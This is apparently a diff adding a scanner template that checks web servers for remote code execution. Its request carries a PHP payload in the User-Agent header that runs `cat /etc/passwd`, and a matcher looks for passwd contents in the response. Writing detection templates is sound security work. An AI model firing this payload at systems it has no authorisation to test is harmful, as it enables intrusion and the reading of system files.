@@ -1,0 +1,27 @@
+id: environment-variable-rce
+
+info:
+  name: Environment Variable RCE Detection
+  author: Jbusiness
+  severity: critical
+  description: |
+    Detects potential Remote Code Execution (RCE) via poisoning process environment variables and including them in file paths.
+    This template demonstrates exploitation by setting a malicious User-Agent header that gets interpreted as an environment variable.
+  tags: rce,environment-variable,web
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: <?=`cat /etc/passwd`?>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:x:0:0:"  # Checks for typical /etc/passwd content
+        part: body
